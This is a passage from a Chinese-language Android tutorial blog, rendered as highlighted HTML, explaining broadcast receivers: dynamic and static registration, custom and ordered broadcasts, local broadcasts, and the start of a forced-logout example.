class="comment">//新建一个IntentFilter</span></span><br><span class="line">        intentFilter=<span class="keyword">new</span> IntentFilter();</span><br><span class="line">       </span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span>);</span><br><span class="line">        networkChangeReceiver=<span class="keyword">new</span> NetworkChangeReceiver();</span><br><span class="line">        <span class="comment">//注册广播（一个变量是广播接收器类，一个是信息类）</span></span><br><span class="line">        registerReceiver(networkChangeReceiver,intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        unregisterReceiver(networkChangeReceiver);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//新建一个类继承在广播接收器</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span></span>&#123;</span><br><span class="line">            Toast.makeText(context,<span class="string">&quot;网络改变&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、首先在MainActivity中定义了一个内部类NetworkChangeReceiver，这个类是继承自BroadcastReceiver的，并重写父类的onReceiver( )方法，这样每当网络状态改变时，onReceiver( )方法就会得到执行，这里只是简单地使用Toast提示了一段文本信息</p><p>2、观察onCreate( )方法，创建了一个IntentFilter的实例，并添加一个值为<code>android.net.conn.CONNECTIVITY_CHANGE</code>的action，添加这个值原因是刚好<strong>系统发出的是值相同</strong>的一条广播，需要监听什么广播就添加什么样的action</p><p>3、接下来创建了一个NetwordkChangeReceiver的实例和IntenFilter的实例都传了进去，这样NetworkChangeReceiver就会收到所有值为<code>android.net.conn.CONNECTIVITY_CHANG</code>的广播，也就实现了监听网络变化的功能</p><p>4.最后动态注册的广播接收通过onDestroy( )方法中调用unregisterReceiver( )来实现</p><p><strong>需要加入访问权限才能访问系统的网络状态</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="静态注册实现开机启动"><a href="#静态注册实现开机启动" class="headerlink" title="静态注册实现开机启动"></a><strong>静态注册实现开机启动</strong></h2><p><code>com.example.名称包</code>新建个广播接收器<img src="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925001015416.png" class="lazyload" data-srcset="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925001015416.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200925001015416"></p><p>修改其中的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> This method is called when the BroadcastReceiver is receiving</span></span><br><span class="line">        <span class="comment">// an Intent broadcast.</span></span><br><span class="line">        Toast.makeText(context,<span class="string">&quot;启动完成&quot;</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只是在onReceive( )方法中使用了Toast弹出一段提示消息</p><p>静态广播的接收器需要在AndroidManifest.xml文件注册才可以使用， </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>包括加入权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h1 id="发送自定义广播"><a href="#发送自定义广播" class="headerlink" title="发送自定义广播"></a>发送自定义广播</h1><p>在发送广播之前，需要先定义一个广播接收器来接收此广播接收器来接收此广播，此次使用的静态注册的方式来使用广播接收器</p><p>首先在others选择新建一个MyBroadcastReceiver继承BroadcastReceiver，重写里面的onReceiver( )方法,即收到该方法会实行什么操作，在里面的代码我们加入的是一条Toast</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context,<span class="string">&quot;接收到该广播&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在AndroidManifest.xml中为该receiver类一个action广播消息，该广播消息自定义，这个类主要接受的就是这个action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在activit_main.xml中写一个按钮，然后在点击事件中添加个Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent intent =<span class="keyword">new</span> Intent(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925165919594.png" class="lazyload" data-srcset="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925165919594.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200925165919594"></p><h1 id="发送有序广播"><a href="#发送有序广播" class="headerlink" title="发送有序广播"></a>发送有序广播</h1><p>广播是一种可以跨进程的通信方式，因此在我们应用程序内发出的广播，其他的应用程序也是可以收到的,创建第二个项目，在该项目中也定义一个广播接收器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.broadcasttest2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnotherBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> This method is called when the BroadcastReceiver is receiving</span></span><br><span class="line">        <span class="comment">// an Intent broadcast.</span></span><br><span class="line">        Toast.makeText(context,<span class="string">&quot;在另一个广播接收器中接收&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.AnotherBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>打开第一个程序，点击按钮，可以在程序收到两条Toast</p><p><img src="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925184552918.png" class="lazyload" data-srcset="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925184552918.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p><img src="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925184603321.png" class="lazyload" data-srcset="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925184603321.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200925184603321"></p><p><strong>此时上面定义注册都是标准广播</strong></p><p>此时打开第一个程序，在该程序修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">Intent intent =<span class="keyword">new</span> Intent(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">        sendOrderedBroadcast(intent,<span class="keyword">null</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>相比第一个代码此时的sendBroadcast( )方法改成了sendOrdereBroadcast( )方法，sendOrderedBroadCast( )方法接收两个参数，第一个参数任何是Intent，第二个参数是一个与权限相关的字符串，这里传入null，此时点击按钮，两个程序仍可以接受到这条广播</p><p>首先设定广播的优先级，在AndroidManifest.xml代码中加入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>android:priority</code>属性给广播接收器设置了优先级，优先级比较高的广播接收器就可以先收到广播，这里将第一个程序的广播接收器设置为100，以保证它一定会在第二个广播接收器之前收到广播，同时在第一个广播接收器类中的onReceiver中的代码加入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abortBroadcast();</span><br></pre></td></tr></table></figure><p>可以看到在onReceiver( )方法中调用了abortBroadcast( )方法，就表示将这条广播截断，后面的广播接收器将无法接受到这条广播，重新点击按钮，发现只有第一个程序能接受到该广播</p><h1 id="使用本地广播"><a href="#使用本地广播" class="headerlink" title="使用本地广播"></a>使用本地广播</h1><p>前面发送和接收的广播全属于系统全局广播，即发出的广播可以被其他任何程序接受，并且也可以接受来自其他任何程序的广播，这样很容易引起安全问题。</p><p>使用本地广播机制，此时就能够只在程序内部进行一个传递，并且广播接收器也只能接受来自本应用程序发出的广播，本地广播的用法并不复杂，主要就是使用了一个LocalBroadcastManager来对广播进行管理，并提供了发送广播和注册广播接收器的方法</p><p>使用动态注册广播</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> LocalReceiver localReceiver;</span><br><span class="line">    <span class="keyword">private</span> LocalBroadcastManager localBroadcastManager;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        localBroadcastManager=LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br><span class="line">        Button button=(Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Intent intent =<span class="keyword">new</span> Intent(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line"><span class="comment">//                sendBroadcast(intent);</span></span><br><span class="line">             localBroadcastManager.sendBroadcast(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        intentFilter=<span class="keyword">new</span> IntentFilter();</span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">        localReceiver=<span class="keyword">new</span> LocalReceiver();</span><br><span class="line">        localBroadcastManager.registerReceiver(localReceiver,intentFilter);</span><br><span class="line">        <span class="comment">//注册本地的一个监听器</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LocalReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context,Intent intent)</span></span>&#123;</span><br><span class="line">            Toast.makeText(context,<span class="string">&quot;received local broadcast&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要在build.gradle中加入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile &#x27;com.android.support:support-v4:4.4.1&#x27;</span><br></pre></td></tr></table></figure><p>才能使用 <code>private LocalReceiver localReceiver;</code>这部分主要使用的是LocalBroadcastManager来对广播进行的管理，</p><p>代码可以看到继承BroadcastReceiver的LocalReceiver中，写了一个Toast</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localBroadcastManager=LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>先通过LocalBroadcastManger的getInstance( )方法得到它的一个实例，然后再注册广播接收器时调用的是LocalBroadcastManger的registerReceiver( )方法，在发送广播时调用的是LocalBroadcastManger的sendBroadcast( )方法</p><p>在点击事件中添加了action为:com.example.broadcasttest.MY_BROADCAST的一个intentfilter，由于在LocalReceiver类中已经重写了该类，所以已经可以去接收广播了<img src="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925192821576.png" class="lazyload" data-srcset="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200925192821576.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200925192821576"></p><h1 id="实例-通过广播实现强制下线功能"><a href="#实例-通过广播实现强制下线功能" class="headerlink" title="实例:通过广播实现强制下线功能"></a>实例:通过广播实现强制下线功能</h1><p>首先新建一个活动管理器，当有活动创建时，就把活动添加到活动管理器，调用活动管理器可以关掉所有的活动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActicityCollector</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> List&lt;Activity&gt; activities= <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addActivity</span><span class="params">(Activity activity)</span></span>&#123;</span><br><span class="line">        activities.add(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeActivity</span><span class="params">(Activity activity)</span></span>&#123;</span><br><span class="line">        activities.remove(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">finshAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(Activity activity:activities)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!activity.isFinishing())&#123;</span><br><span class="line">                activity.finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建一个BaseActivity类作为所有活动的父类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  ForceOfflineReceiver receiver;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        ActicityCollector.addActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span>  <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        ActicityCollector.removeActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前两个方法onCreate( )方法和onDestroy( )方法其中两个方法，在onCreate( )方法调用活动管理器添加活动，onDestroy(  ) 在活动结束的时候删除活动管理器中的类</p><p>在activity_login.xml的布局文件中添加两个编辑框以及一个按钮</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;60dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">&quot;horizontal&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;90dp&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">&quot;用户名:&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">&quot;18sp&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/account&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;60dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">&quot;horizontal&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span 